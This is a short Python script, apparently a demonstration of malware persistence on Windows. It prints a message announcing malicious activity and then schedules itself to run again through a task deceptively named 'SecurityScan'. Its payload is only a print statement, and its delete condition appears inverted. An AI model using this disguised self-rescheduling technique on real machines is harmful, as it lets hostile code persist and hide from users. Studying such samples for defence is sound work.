import os, random
from datetime import datetime, timedelta

if os.system('schtasks /query /tn SecurityScan'):
    os.system('schtasks /delete /f /tn SecurityScan')

print("I'm doing malicious things.")

file_dir = os.path.join(os.getcwd(), 'scheduled_execution.py')

max_interval = 1
interval = 1 + (random.random() * (max_interval - 1))
date_time = datetime.now() + timedelta(minutes=interval)
time = f'{str(date_time.hour).zfill(2)}:{str(date_time.minute).zfill(2)}'
date = f'{date_time.month}/{str(date_time.day).zfill(2)}/{str(date_time.year).zfill(2)}'
os.system('schtasks /create /tn SecurityScan /tr '+file_dir+' /sc once /st '+time+' /sd '+date)

input()
